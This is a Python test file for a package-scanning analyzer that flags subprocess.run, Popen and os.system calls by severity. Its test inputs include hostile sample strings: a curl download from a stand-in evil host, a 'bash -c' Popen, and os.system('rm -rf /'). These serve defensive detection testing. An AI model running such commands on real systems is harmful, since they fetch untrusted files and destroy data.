"""Tests for SubprocessAnalyzer."""

from pkgxray.analyzers.subprocess_calls import SubprocessAnalyzer
from pkgxray.analyzers.base import Severity


def test_import_subprocess_not_flagged():
    """Importar subprocess es legítimo; no debe generar findings."""
    analyzer = SubprocessAnalyzer()
    findings = analyzer.analyze('import subprocess', 'test.py')
    assert len(findings) == 0


def test_detects_subprocess_run_in_function():
    """subprocess.run() dentro de una función → HIGH."""
    analyzer = SubprocessAnalyzer()
    code = 'def build():\n    subprocess.run(["make"])'
    findings = analyzer.analyze(code, 'test.py')
    high = [f for f in findings if f.severity == Severity.HIGH and "run" in f.description]
    assert len(high) >= 1


def test_detects_subprocess_run_at_module_level():
    """subprocess.run() al nivel del módulo → CRITICAL (se ejecuta al importar)."""
    analyzer = SubprocessAnalyzer()
    code = 'subprocess.run(["curl", "http://evil.example.com", "-o", "/tmp/x"])'
    findings = analyzer.analyze(code, 'test.py')
    critical = [f for f in findings if f.severity == Severity.CRITICAL and "run" in f.description]
    assert len(critical) >= 1
    assert "nivel del módulo" in critical[0].description


def test_detects_subprocess_popen():
    """subprocess.Popen() siempre es CRITICAL."""
    analyzer = SubprocessAnalyzer()
    code = 'def shell():\n    subprocess.Popen(["bash", "-c", cmd])'
    findings = analyzer.analyze(code, 'test.py')
    critical = [f for f in findings if f.severity == Severity.CRITICAL]
    assert len(critical) >= 1


def test_detects_os_system():
    """os.system() siempre es CRITICAL."""
    analyzer = SubprocessAnalyzer()
    code = 'import os\nos.system("rm -rf /")'
    findings = analyzer.analyze(code, 'test.py')
    critical = [f for f in findings if f.severity == Severity.CRITICAL and "system" in f.description]
    assert len(critical) >= 1


def test_safe_code_no_subprocess():
    analyzer = SubprocessAnalyzer()
    findings = analyzer.analyze('x = 1 + 2\nprint(x)', 'test.py')
    assert len(findings) == 0


def test_syntax_error_no_crash():
    analyzer = SubprocessAnalyzer()
    findings = analyzer.analyze('def broken(:\n  pass', 'test.py')
    assert isinstance(findings, list)


def test_analyzer_name():
    analyzer = SubprocessAnalyzer()
    code = 'def run_cmd():\n    subprocess.run(["ls"])'
    findings = analyzer.analyze(code, 'test.py')
    assert all(f.analyzer_name == "subprocess" for f in findings)
